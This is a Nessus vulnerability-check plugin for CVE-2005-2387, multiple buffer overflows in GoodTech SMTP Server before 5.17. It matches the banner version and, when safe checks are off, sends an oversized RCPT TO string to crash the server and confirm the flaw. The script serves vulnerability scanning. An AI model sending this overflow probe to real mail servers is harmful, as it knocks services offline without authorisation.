#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(19384);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2005-2387");
  script_bugtraq_id(14357);
  script_xref(name:"OSVDB", value:"18250");

  script_name(english:"GoodTech SMTP Server < 5.17 Multiple Buffer Overflows");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote SMTP server contains several buffer overflow flaws." );
 script_set_attribute(attribute:"description", value:
"The version of GoodTech SMTP Server running on the remote host is
prone to multiple buffer overflow vulnerabilities when processing RCPT
TO commands.  An attacker can exploit these flaws to run arbitrary
code remotely, by default as the SYSTEM user." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/406321/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to GoodTech SMTP Server 5.17 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );
script_end_attributes();

  script_summary(english:"Checks for multiple buffer overflow vulnerabilities in GoodTech SMTP Server < 5.17");
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"SMTP problems");
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_dependencies("smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);
  script_exclude_keys("SMTP/wrapped");

  exit(0);
}


include("smtp_func.inc");
include("misc_func.inc");


port = get_kb_item("Services/smtp");
if (!port) port = 25;
if (!get_port_state(port)) exit(0);
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);


# If the banner suggests it's GoodTech...
banner = get_smtp_banner(port:port);
if (banner && "Simple Mail Transfer Service Ready. Version" >< banner) {
  # If safe checks are enabled...
  if (safe_checks()) {
    # nb: versions < 5.17 are affected.
    if (banner =~ "Version ([0-4]\.|5\.(0|1[0-6][^0-9]))") {
      report = string(
        "Note that Nessus has determined the vulnerability exists on the\n",
        "remote host simply by looking at the installed version number of\n",
        "GoodTech SMTP Server.\n"
      );
      security_hole(port:port, extra:report);
    }
  }
  # Otherwise...
  else {
    # Let's try to crash it.
    soc = smtp_open(port:port, helo:rand_str());
    if (!soc) exit(0);

    c = string("RCPT TO: <aa@", crap(1100), ">");
    send(socket:soc, data:string(c, "\r\n"));
    s = smtp_recv_line(socket:soc);

    # If it's down, try once to reconnect.
    if (!s) {
      close(soc);
      sleep(1);
      # Is the daemon history?
      soc = open_sock_tcp(port);
      if (!soc) {
        security_hole(port);
        exit(0);
      }
    }

    # Let's be nice.
    c = "QUIT";
    send(socket:soc, data:string(c, "\r\n"));
    close(soc);
  }
}
